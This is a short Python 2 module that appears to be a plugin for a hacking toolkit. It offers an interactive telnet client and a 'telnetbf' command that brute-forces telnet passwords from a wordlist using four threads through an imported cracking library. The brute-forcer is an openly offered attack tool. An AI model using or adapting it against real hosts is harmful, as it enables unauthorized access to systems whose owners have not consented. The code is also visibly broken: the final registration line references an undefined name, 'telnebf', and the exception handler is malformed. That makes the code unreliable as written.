import telnetlib, socket
from libs.zippycrack import *

desc = 'provides an interactive telnet shell and other utilities related to telnet'
author = 'nwx'
cmds = []

def telnetinteract():
	host = raw_input('host or ip to connect to> ')
	port = input('port to connect to> ')
	tel = telnetlib.Telnet()
	tel.open(host,port)
	try:
		tel.interact()
	except KeyboardInterrupt:
		tel.close()
cmds.append(('telnet','opens a telnet connection and an interactive shell',telnetinteract))

def telnetbf():
	host = raw_input('host or ip to connect to> ')
	port = input('port to connect to> ')
	pwlist = raw_input('password list> ').strip()
	prompt = raw_input('the password prompt (the cue to send the password, usually "Password: ")> ')
	incorrect = raw_input('first thing the server says if password is incorrect (cue to disconnect and try another)? ')
	def try_pass(pw):
		try:
			tel = telnetlib.Telnet()
			tel.open(host,port)
			tel.read_until(prompt,5)
			tel.write(pw)
			tel.write('\n')
			ret = tel.read_until(incorrect,5)
			tel.close()
			if incorrect in ret:
				return False
			return True
		except socket.error, socket.herror, socket.gaierror, socket.timeout, telnetlib.EOFError:
			return False
	zc = zippycrack(try_pass,pwlist,num_threads=4,cont=False)

cmds.append(('telnetbf','brute-force a telnet password',telnebf))
